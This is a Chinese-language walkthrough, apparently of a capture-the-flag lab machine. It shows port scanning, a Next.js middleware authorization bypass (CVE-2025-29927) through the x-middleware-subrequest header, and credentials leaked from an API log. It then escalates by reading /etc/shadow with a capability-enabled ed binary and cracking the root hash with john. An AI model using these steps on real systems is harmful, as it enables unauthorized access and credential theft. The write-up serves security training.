# 信息搜集

端口扫描

```
┌──(kali㉿kali)-[~]
└─$ nmap -A -p- 192.168.21.12
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-12 09:56 EDT
Nmap scan report for 192.168.21.12
Host is up (0.00039s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)
|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)
|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)
80/tcp   open  http    Apache httpd 2.4.62 ((Debian))
|_http-server-header: Apache/2.4.62 (Debian)
|_http-title: Site doesn't have a title (text/html).
3000/tcp open  ppp?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     X-Powered-By: Next.js
|     ETag: "wvpz46leg16iz"
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 8460
|     Vary: Accept-Encoding
|     Date: Fri, 12 Sep 2025 13:56:56 GMT
|     Connection: close
|     <!DOCTYPE html><html><head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width"/><title class="jsx-1eb51da0ac6ad36f">maze-sec | Cybersecurity Research</title><link rel="icon" href="/favicon.ico" class="jsx-1eb51da0ac6ad36f"/><meta name="hint" content="Authorized access at a secret endpoint. Try 2025." class="jsx-1eb51da0ac6ad36f"/><meta name="next-head-count" content="5"/><noscript data-n-css=""></noscript><script defer="" nomodule="" src="/_next/static/chunks/polyfills-c67a75d1b6f99dc8.js"></script><script src="/_next/static/chunks/webpack-9b312e20a4e32339.js" defer=""></script><script src="/_next/static/chunks/framework-6805d7a71c2d770b.js" defer=""></script><scr
|   HTTPOptions: 
|     HTTP/1.1 405 Method Not Allowed
|     Allow: GET
|     Allow: HEAD
|     Cache-Control: no-cache, no-store, max-age=0, must-revalidate
|     X-Powered-By: Next.js
|     Content-Type: text/html; charset=utf-8
|     Vary: Accept-Encoding
|     Date: Fri, 12 Sep 2025 13:56:56 GMT
|     Connection: close
|     <!DOCTYPE html><html><head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width"/><title>405: Method Not Allowed</title><meta name="next-head-count" content="3"/><noscript data-n-css=""></noscript><script defer="" nomodule="" src="/_next/static/chunks/polyfills-c67a75d1b6f99dc8.js"></script><script src="/_next/static/chunks/webpack-9b312e20a4e32339.js" defer=""></script><script src="/_next/static/chunks/framework-6805d7a71c2d770b.js" defer=""></script><script src="/_next/static/chunks/main-c396fbccb3dec4e9.js" defer=""></script><script src="/_next/static/chunks/pages/_app-dc14f8483464b560.js" defer=""></scri
|   Help, NCP: 
|     HTTP/1.1 400 Bad Request
|_    Connection: close
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3000-TCP:V=7.95%I=7%D=9/12%Time=68C426A8%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,1C48,"HTTP/1\.1\x20200\x20OK\r\nX-Powered-By:\x20Next\.js\r\nE
SF:Tag:\x20\"wvpz46leg16iz\"\r\nContent-Type:\x20text/html;\x20charset=utf
SF:-8\r\nContent-Length:\x208460\r\nVary:\x20Accept-Encoding\r\nDate:\x20F
SF:ri,\x2012\x20Sep\x202025\x2013:56:56\x20GMT\r\nConnection:\x20close\r\n
SF:\r\n<!DOCTYPE\x20html><html><head><meta\x20charSet=\"utf-8\"/><meta\x20
SF:name=\"viewport\"\x20content=\"width=device-width\"/><title\x20class=\"
SF:jsx-1eb51da0ac6ad36f\">maze-sec\x20\|\x20Cybersecurity\x20Research</tit
SF:le><link\x20rel=\"icon\"\x20href=\"/favicon\.ico\"\x20class=\"jsx-1eb51
SF:da0ac6ad36f\"/><meta\x20name=\"hint\"\x20content=\"Authorized\x20access
SF:\x20at\x20a\x20secret\x20endpoint\.\x20Try\x202025\.\"\x20class=\"jsx-1
SF:eb51da0ac6ad36f\"/><meta\x20name=\"next-head-count\"\x20content=\"5\"/>
SF:<noscript\x20data-n-css=\"\"></noscript><script\x20defer=\"\"\x20nomodu
SF:le=\"\"\x20src=\"/_next/static/chunks/polyfills-c67a75d1b6f99dc8\.js\">
SF:</script><script\x20src=\"/_next/static/chunks/webpack-9b312e20a4e32339
SF:\.js\"\x20defer=\"\"></script><script\x20src=\"/_next/static/chunks/fra
SF:mework-6805d7a71c2d770b\.js\"\x20defer=\"\"></script><scr")%r(Help,2F,"
SF:HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%r(
SF:NCP,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\
SF:r\n")%r(HTTPOptions,A13,"HTTP/1\.1\x20405\x20Method\x20Not\x20Allowed\r
SF:\nAllow:\x20GET\r\nAllow:\x20HEAD\r\nCache-Control:\x20no-cache,\x20no-
SF:store,\x20max-age=0,\x20must-revalidate\r\nX-Powered-By:\x20Next\.js\r\
SF:nContent-Type:\x20text/html;\x20charset=utf-8\r\nVary:\x20Accept-Encodi
SF:ng\r\nDate:\x20Fri,\x2012\x20Sep\x202025\x2013:56:56\x20GMT\r\nConnecti
SF:on:\x20close\r\n\r\n<!DOCTYPE\x20html><html><head><meta\x20charSet=\"ut
SF:f-8\"/><meta\x20name=\"viewport\"\x20content=\"width=device-width\"/><t
SF:itle>405:\x20Method\x20Not\x20Allowed</title><meta\x20name=\"next-head-
SF:count\"\x20content=\"3\"/><noscript\x20data-n-css=\"\"></noscript><scri
SF:pt\x20defer=\"\"\x20nomodule=\"\"\x20src=\"/_next/static/chunks/polyfil
SF:ls-c67a75d1b6f99dc8\.js\"></script><script\x20src=\"/_next/static/chunk
SF:s/webpack-9b312e20a4e32339\.js\"\x20defer=\"\"></script><script\x20src=
SF:\"/_next/static/chunks/framework-6805d7a71c2d770b\.js\"\x20defer=\"\"><
SF:/script><script\x20src=\"/_next/static/chunks/main-c396fbccb3dec4e9\.js
SF:\"\x20defer=\"\"></script><script\x20src=\"/_next/static/chunks/pages/_
SF:app-dc14f8483464b560\.js\"\x20defer=\"\"></scri");
MAC Address: 08:00:27:89:BA:C2 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.39 ms 192.168.21.12

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.62 seconds
```

# 漏洞利用

80端口没有东西，看一下3000

```
┌──(kali㉿kali)-[~]
└─$ curl http://192.168.21.12:3000
<!DOCTYPE html><html><head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width"/><title class="jsx-1eb51da0ac6ad36f">maze-sec | Cybersecurity Research</title><link rel="icon" href="/favicon.ico" class="jsx-1eb51da0ac6ad36f"/><meta name="hint" content="Authorized access at a secret endpoint. Try 2025." class="jsx-1eb51da0ac6ad36f"/><meta name="next-head-count" content="5"/><noscript data-n-css=""></noscript><script defer="" nomodule="" src="/_next/static/chunks/polyfills-c67a75d1b6f99dc8.js"></script><script src="/_next/static/chunks/webpack-9b312e20a4e32339.js" defer=""></script><script src="/_next/static/chunks/framework-6805d7a71c2d770b.js" defer=""></script><script src="/_next/static/chunks/main-c396fbccb3dec4e9.js" defer=""></script><script src="/_next/static/chunks/pages/_app-dc14f8483464b560.js" defer=""></script><script src="/_next/static/chunks/38-70306b8bb9e11254.js" defer=""></script><script src="/_next/static/chunks/pages/index-4d77c52429a9c6f2.js" defer=""></script><script src="/_next/static/LYaoYUIqJoZc2GUvRxaSo/_buildManifest.js" defer=""></script><script src="/_next/static/LYaoYUIqJoZc2GUvRxaSo/_ssgManifest.js" defer=""></script><style id="__jsx-1eb51da0ac6ad36f">.container.jsx-1eb51da0ac6ad36f{min-height:100vh;padding:0 1rem;display:-webkit-box;display:-webkit-flex;display:-moz-box;display:-ms-flexbox;display:flex;-webkit-box-orient:vertical;-webkit-box-direction:normal;-webkit-flex-direction:column;-moz-box-orient:vertical;-moz-box-direction:normal;-ms-flex-direction:column;flex-direction:column;-webkit-box-pack:center;-webkit-justify-content:center;-moz-box-pack:center;-ms-flex-pack:center;justify-content:center;-webkit-box-align:center;-webkit-align-items:center;-moz-box-align:center;-ms-flex-align:center;align-items:center;background:-webkit-linear-gradient(315deg,#0f2027,#203a43,#2c5364);background:-moz-linear-gradient(315deg,#0f2027,#203a43,#2c5364);background:-o-linear-gradient(315deg,#0f2027,#203a43,#2c5364);background:linear-gradient(135deg,#0f2027,#203a43,#2c5364);color:#fff}.header.jsx-1eb51da0ac6ad36f{width:100%;display:-webkit-box;display:-webkit-flex;display:-moz-box;display:-ms-flexbox;display:flex;-webkit-box-pack:justify;-webkit-justify-content:space-between;-moz-box-pack:justify;-ms-flex-pack:justify;justify-content:space-between;-webkit-box-align:center;-webkit-align-items:center;-moz-box-align:center;-ms-flex-align:center;align-items:center;padding:2rem 0;border-bottom:1px solid rgba(255,255,255,.2)}.logo.jsx-1eb51da0ac6ad36f h1.jsx-1eb51da0ac6ad36f{margin:0;font-size:2.5rem;color:#4db8ff}.logo.jsx-1eb51da0ac6ad36f span.jsx-1eb51da0ac6ad36f{font-size:.9rem;opacity:.7}.nav.jsx-1eb51da0ac6ad36f ul.jsx-1eb51da0ac6ad36f{display:-webkit-box;display:-webkit-flex;display:-moz-box;display:-ms-flexbox;display:flex;list-style:none;margin:0;padding:0}.nav.jsx-1eb51da0ac6ad36f li.jsx-1eb51da0ac6ad36f{margin:0 1.5rem}.nav.jsx-1eb51da0ac6ad36f a.jsx-1eb51da0ac6ad36f{color:#fff;text-decoration:none;font-weight:500;-webkit-transition:color.3s;-moz-transition:color.3s;-o-transition:color.3s;transition:color.3s}.nav.jsx-1eb51da0ac6ad36f a.jsx-1eb51da0ac6ad36f:hover{color:#4db8ff}.main.jsx-1eb51da0ac6ad36f{padding:4rem 0;-webkit-box-flex:1;-webkit-flex:1;-moz-box-flex:1;-ms-flex:1;flex:1;display:-webkit-box;display:-webkit-flex;display:-moz-box;display:-ms-flexbox;display:flex;-webkit-box-orient:vertical;-webkit-box-direction:normal;-webkit-flex-direction:column;-moz-box-orient:vertical;-moz-box-direction:normal;-ms-flex-direction:column;flex-direction:column;-webkit-box-align:center;-webkit-align-items:center;-moz-box-align:center;-ms-flex-align:center;align-items:center;width:100%;max-width:1200px}.hero.jsx-1eb51da0ac6ad36f{text-align:center;max-width:800px;margin-bottom:3rem}.hero.jsx-1eb51da0ac6ad36f h2.jsx-1eb51da0ac6ad36f{font-size:2.8rem;margin-bottom:1rem;color:#4db8ff}.hero.jsx-1eb51da0ac6ad36f p.jsx-1eb51da0ac6ad36f{font-size:1.2rem;line-height:1.6;opacity:.9}.cta-buttons.jsx-1eb51da0ac6ad36f{display:-webkit-box;display:-webkit-flex;display:-moz-box;display:-ms-flexbox;display:flex;gap:1rem;-webkit-box-pack:center;-webkit-justify-content:center;-moz-box-pack:center;-ms-flex-pack:center;justify-content:center;margin-top:2rem}.btn.jsx-1eb51da0ac6ad36f{padding:.8rem 1.8rem;-webkit-border-radius:6px;-moz-border-radius:6px;border-radius:6px;text-decoration:none;font-weight:600;-webkit-transition:all.3s;-moz-transition:all.3s;-o-transition:all.3s;transition:all.3s}.primary.jsx-1eb51da0ac6ad36f{background:#4db8ff;color:#0f2027}.primary.jsx-1eb51da0ac6ad36f:hover{background:#2a9ef0}.secondary.jsx-1eb51da0ac6ad36f{border:1px solid#4db8ff;color:#4db8ff}.secondary.jsx-1eb51da0ac6ad36f:hover{background:rgba(77,184,255,.1)}.features.jsx-1eb51da0ac6ad36f{display:grid;grid-template-columns:repeat(auto-fit,minmax(250px,1fr));gap:2rem;width:100%}.feature.jsx-1eb51da0ac6ad36f{background:rgba(255,255,255,.05);padding:2rem;-webkit-border-radius:8px;-moz-border-radius:8px;border-radius:8px;text-align:center;-webkit-transition:-webkit-transform.3s;-moz-transition:-moz-transform.3s;-o-transition:-o-transform.3s;transition:-webkit-transform.3s;transition:-moz-transform.3s;transition:-o-transform.3s;transition:transform.3s}.feature.jsx-1eb51da0ac6ad36f:hover{-webkit-transform:translateY(-5px);-moz-transform:translateY(-5px);-ms-transform:translateY(-5px);-o-transform:translateY(-5px);transform:translateY(-5px)}.feature.jsx-1eb51da0ac6ad36f h3.jsx-1eb51da0ac6ad36f{color:#4db8ff;margin-bottom:1rem}.admin-hint.jsx-1eb51da0ac6ad36f{margin-top:3rem;opacity:.6;text-align:center}.footer.jsx-1eb51da0ac6ad36f{width:100%;padding:1rem 0;border-top:1px solid rgba(255,255,255,.2);text-align:center;opacity:.7}@media(max-width:768px){.features.jsx-1eb51da0ac6ad36f{grid-template-columns:1fr}.header.jsx-1eb51da0ac6ad36f{-webkit-box-orient:vertical;-webkit-box-direction:normal;-webkit-flex-direction:column;-moz-box-orient:vertical;-moz-box-direction:normal;-ms-flex-direction:column;flex-direction:column;text-align:center}.nav.jsx-1eb51da0ac6ad36f{margin-top:1rem}.nav.jsx-1eb51da0ac6ad36f li.jsx-1eb51da0ac6ad36f{margin:0 .5rem}}</style></head><body><div id="__next"><div class="jsx-1eb51da0ac6ad36f container"><header class="jsx-1eb51da0ac6ad36f header"><div class="jsx-1eb51da0ac6ad36f logo"><h1 class="jsx-1eb51da0ac6ad36f">maze-sec</h1><span class="jsx-1eb51da0ac6ad36f">Cutting-Edge Cybersecurity Solutions</span></div><nav class="jsx-1eb51da0ac6ad36f nav"><ul class="jsx-1eb51da0ac6ad36f"><li class="jsx-1eb51da0ac6ad36f"><a href="/">Home</a></li><li class="jsx-1eb51da0ac6ad36f"><a href="/services">Services</a></li><li class="jsx-1eb51da0ac6ad36f"><a href="/research">Research</a></li><li class="jsx-1eb51da0ac6ad36f"><a href="/contact">Contact</a></li></ul></nav></header><main class="jsx-1eb51da0ac6ad36f main"><section class="jsx-1eb51da0ac6ad36f hero"><h2 class="jsx-1eb51da0ac6ad36f">Securing the Digital World</h2><p class="jsx-1eb51da0ac6ad36f">maze-sec specializes in vulnerability research, penetration testing, and threat intelligence to protect your assets.</p><div class="jsx-1eb51da0ac6ad36f cta-buttons"><a href="/services">Explore Services</a><a href="/contact">Get in Touch</a></div></section><section class="jsx-1eb51da0ac6ad36f features"><div class="jsx-1eb51da0ac6ad36f feature"><h3 class="jsx-1eb51da0ac6ad36f">Vulnerability Research</h3><p class="jsx-1eb51da0ac6ad36f">Uncovering critical flaws in modern software and systems.</p></div><div class="jsx-1eb51da0ac6ad36f feature"><h3 class="jsx-1eb51da0ac6ad36f">Penetration Testing</h3><p class="jsx-1eb51da0ac6ad36f">Rigorous assessments to strengthen your defenses.</p></div><div class="jsx-1eb51da0ac6ad36f feature"><h3 class="jsx-1eb51da0ac6ad36f">Threat Intelligence</h3><p class="jsx-1eb51da0ac6ad36f">Stay ahead of adversaries with actionable insights.</p></div></section><section class="jsx-1eb51da0ac6ad36f admin-hint"><p class="jsx-1eb51da0ac6ad36f hint-text"><small class="jsx-1eb51da0ac6ad36f">Administrative access restricted. Authorized personnel only.</small></p></section></main><footer class="jsx-1eb51da0ac6ad36f footer"><p class="jsx-1eb51da0ac6ad36f">© 2025 maze-sec. All rights reserved.</p></footer></div></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{}},"page":"/","query":{},"buildId":"LYaoYUIqJoZc2GUvRxaSo","nextExport":true,"autoExport":true,"isFallback":false,"scriptLoader":[]}</script></body></html>
```

提示：<meta name="hint" content="Authorized access at a secret endpoint. Try 2025." />

```
┌──(kali㉿kali)-[~]
└─$ curl http://192.168.21.12:3000/admin
/secret-login-2025
┌──(kali㉿kali)-[~]
└─$ curl http://192.168.21.12:3000/secret-login-2025
<!DOCTYPE html><html><head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width"/><title class="jsx-51c627a66454ffc6">Restricted Login | maze-sec</title><meta name="next-head-count" content="3"/><noscript data-n-css=""></noscript><script defer="" nomodule="" src="/_next/static/chunks/polyfills-c67a75d1b6f99dc8.js"></script><script src="/_next/static/chunks/webpack-9b312e20a4e32339.js" defer=""></script><script src="/_next/static/chunks/framework-6805d7a71c2d770b.js" defer=""></script><script src="/_next/static/chunks/main-c396fbccb3dec4e9.js" defer=""></script><script src="/_next/static/chunks/pages/_app-dc14f8483464b560.js" defer=""></script><script src="/_next/static/chunks/38-70306b8bb9e11254.js" defer=""></script><script src="/_next/static/chunks/pages/secret-login-2025-2d3e58ee9a68cbe4.js" defer=""></script><script src="/_next/static/LYaoYUIqJoZc2GUvRxaSo/_buildManifest.js" defer=""></script><script src="/_next/static/LYaoYUIqJoZc2GUvRxaSo/_ssgManifest.js" defer=""></script><style id="__jsx-51c627a66454ffc6">.container.jsx-51c627a66454ffc6{min-height:100vh;display:-webkit-box;display:-webkit-flex;display:-moz-box;display:-ms-flexbox;display:flex;-webkit-box-pack:center;-webkit-justify-content:center;-moz-box-pack:center;-ms-flex-pack:center;justify-content:center;-webkit-box-align:center;-webkit-align-items:center;-moz-box-align:center;-ms-flex-align:center;align-items:center;background:-webkit-linear-gradient(315deg,#0f2027,#203a43,#2c5364);background:-moz-linear-gradient(315deg,#0f2027,#203a43,#2c5364);background:-o-linear-gradient(315deg,#0f2027,#203a43,#2c5364);background:linear-gradient(135deg,#0f2027,#203a43,#2c5364);padding:1rem}.login-box.jsx-51c627a66454ffc6{background:rgba(255,255,255,.05);padding:2rem;-webkit-border-radius:8px;-moz-border-radius:8px;border-radius:8px;-webkit-box-shadow:0 4px 20px rgba(0,0,0,.3);-moz-box-shadow:0 4px 20px rgba(0,0,0,.3);box-shadow:0 4px 20px rgba(0,0,0,.3);width:100%;max-width:400px;-webkit-backdrop-filter:blur(10px);backdrop-filter:blur(10px)}h2.jsx-51c627a66454ffc6{color:#4db8ff;text-align:center;margin-bottom:1rem}.hint.jsx-51c627a66454ffc6{text-align:center;opacity:.8;margin-bottom:1.5rem}.input-group.jsx-51c627a66454ffc6{margin-bottom:1.5rem}label.jsx-51c627a66454ffc6{display:block;margin-bottom:.5rem;font-weight:600;color:#fff}input.jsx-51c627a66454ffc6{width:100%;padding:.8rem;border:1px solid rgba(255,255,255,.2);-webkit-border-radius:4px;-moz-border-radius:4px;border-radius:4px;background:rgba(0,0,0,.3);color:#fff;-webkit-box-sizing:border-box;-moz-box-sizing:border-box;box-sizing:border-box}.error.jsx-51c627a66454ffc6{background:rgba(255,0,0,.2);border:1px solid rgba(255,0,0,.5);color:#ff6b6b;padding:.8rem;-webkit-border-radius:4px;-moz-border-radius:4px;border-radius:4px;margin-bottom:1.5rem}.login-btn.jsx-51c627a66454ffc6{width:100%;padding:.8rem;background:#4db8ff;color:#0f2027;border:none;-webkit-border-radius:4px;-moz-border-radius:4px;border-radius:4px;font-weight:600;cursor:pointer;-webkit-transition:background.3s;-moz-transition:background.3s;-o-transition:background.3s;transition:background.3s}.login-btn.jsx-51c627a66454ffc6:hover{background:#2a9ef0}.note.jsx-51c627a66454ffc6{margin-top:1.5rem;text-align:center;opacity:.6}</style></head><body><div id="__next"><div class="jsx-51c627a66454ffc6 container"><div class="jsx-51c627a66454ffc6 login-box"><h2 class="jsx-51c627a66454ffc6">maze-sec Secure Login</h2><p class="jsx-51c627a66454ffc6 hint">Authorized personnel only. Unauthorized attempts are logged.</p><form class="jsx-51c627a66454ffc6"><div class="jsx-51c627a66454ffc6 input-group"><label for="username" class="jsx-51c627a66454ffc6">Username</label><input type="text" id="username" required="" class="jsx-51c627a66454ffc6" value=""/></div><div class="jsx-51c627a66454ffc6 input-group"><label for="password" class="jsx-51c627a66454ffc6">Password</label><input type="password" id="password" required="" class="jsx-51c627a66454ffc6" value=""/></div><button type="submit" class="jsx-51c627a66454ffc6 login-btn">Sign In</button></form><p class="jsx-51c627a66454ffc6 note"><small class="jsx-51c627a66454ffc6">Contact system administrator for credential issues.</small></p></div></div></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{}},"page":"/secret-login-2025","query":{},"buildId":"LYaoYUIqJoZc2GUvRxaSo","nextExport":true,"autoExport":true,"isFallback":false,"scriptLoader":[]}</script></body></html>                                            
```

<img width="490" height="537" alt="图片" src="https://github.com/user-attachments/assets/bc824b04-bc5a-4a54-a457-7250a7f22fc1" />

寻找相关漏洞：CVE-2025-29927,带着头进行扫描

```
┌──(kali㉿kali)-[~]
└─$ dirsearch -u http://192.168.21.12:3000/api -H "x-middleware-subrequest: middleware" -w SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3                                     
 (_||| _) (/_(_|| (_| )                                              
                                                                     
Extensions: php, aspx, jsp, html, js | HTTP method: GET
Threads: 25 | Wordlist size: 1185239

Output File: /home/kali/reports/http_192.168.21.12_3000/_api_25-09-12_11-55-59.txt

Target: http://192.168.21.12:3000/

[11:55:59] Starting: api/                                            
[11:56:04] 200 -  715B  - /api/logs
```

成功利用

```
	"2025-09-12 10:00:00 - System initialized."
1	"2025-09-12 10:05:23 - Login attempt: c1trus (IP: 192.168.1.100)"
2	"2025-09-12 10:06:45 - Failed login: Incorrect password"
3	"2025-09-12 10:07:12 - Successful login: c1trus with password MazeSecure@2025!"
4	"2025-09-12 10:10:34 - Command: sudo su - c1trus"
5	"2025-09-12 10:11:56 - File accessed: /etc/passwd - root:x:0:0:root:/root:/bin/bash\nc1trus:x:1000:1000:C1trus Admin,,,:/home/c1trus:/bin/bash"
6	"2025-09-12 10:15:22 - SSH key for c1trus: ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC..."
7	"2025-09-12 10:20:09 - Database backup: user=c1trus_db_admin, pass=MazeDB2025!"
8	"2025-09-12 10:25:47 - System update completed."
9	"2025-09-12 10:30:15 - User c1trus logged out."
```

ssh登录成功

```
┌──(kali㉿kali)-[~]
└─$ ssh c1trus@192.168.21.12            
The authenticity of host '192.168.21.12 (192.168.21.12)' can't be established.
ED25519 key fingerprint is SHA256:O2iH79i8PgOwV/Kp8ekTYyGMG8iHT+YlWuYC85SbWSQ.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:20: [hashed name]
    ~/.ssh/known_hosts:21: [hashed name]
    ~/.ssh/known_hosts:22: [hashed name]
    ~/.ssh/known_hosts:23: [hashed name]
    ~/.ssh/known_hosts:24: [hashed name]
    ~/.ssh/known_hosts:25: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.21.12' (ED25519) to the list of known hosts.
c1trus@192.168.21.12's password: 
Linux Next 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Fri Sep 12 05:56:50 2025 from 10.0.2.77
$ id
uid=1000(c1trus) gid=1000(c1trus) groups=1000(c1trus)
```

# 权限提升

查看一下有没有可以提权利用的地方

```
$ /usr/sbin/getcap -r / 2>/dev/null
/usr/bin/ed = cap_dac_read_search+ep
/usr/bin/ping = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
```

<img width="1029" height="229" alt="图片" src="https://github.com/user-attachments/assets/3eedda93-daa0-40b9-87e4-c603ea80e0cd" />

提权

```
c1trus@Next:~$ /usr/bin/ed /etc/shadow
941
,p
root:$6$OkwDvceFhTabwVGQ$noxBcQ9o14G0cTyNdu9EBOoq3AmB660NS5Usr83oGcJNjxezZrwA/5ME3smPLzoizro5LRFqFKQlbO42l4rvt1:20343:0:99999:7:::
daemon:*:20166:0:99999:7:::
bin:*:20166:0:99999:7:::
sys:*:20166:0:99999:7:::
sync:*:20166:0:99999:7:::
games:*:20166:0:99999:7:::
man:*:20166:0:99999:7:::
lp:*:20166:0:99999:7:::
mail:*:20166:0:99999:7:::
news:*:20166:0:99999:7:::
uucp:*:20166:0:99999:7:::
proxy:*:20166:0:99999:7:::
www-data:*:20166:0:99999:7:::
backup:*:20166:0:99999:7:::
list:*:20166:0:99999:7:::
irc:*:20166:0:99999:7:::
gnats:*:20166:0:99999:7:::
nobody:*:20166:0:99999:7:::
_apt:*:20166:0:99999:7:::
systemd-timesync:*:20166:0:99999:7:::
systemd-network:*:20166:0:99999:7:::
systemd-resolve:*:20166:0:99999:7:::
systemd-coredump:!!:20166::::::
messagebus:*:20166:0:99999:7:::
sshd:*:20166:0:99999:7:::
c1trus:$6$p/7V81X3jW.t4UVk$p0QwkfnPmVwKd5G45ABhShw/bdysk8cCAOF7a2AU/rKcpjFbmeGEN2Wq6AyXcLLgq3ldpBMWDg7VSupIzy7w4/:20343:0:99999:7:::
┌──(kali㉿kali)-[~]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
bisrock          (root)     
1g 0:00:00:13 DONE (2025-09-12 12:40) 0.07363g/s 4373p/s 4373c/s 4373C/s blueboy1..062906
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
┌──(kali㉿kali)-[~]
└─$ ssh root@192.168.21.12              
root@192.168.21.12's password: 
Linux Next 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Fri Sep 12 08:47:51 2025 from 10.0.2.77
root@Next:~# id
uid=0(root) gid=0(root) groups=0(root)
```
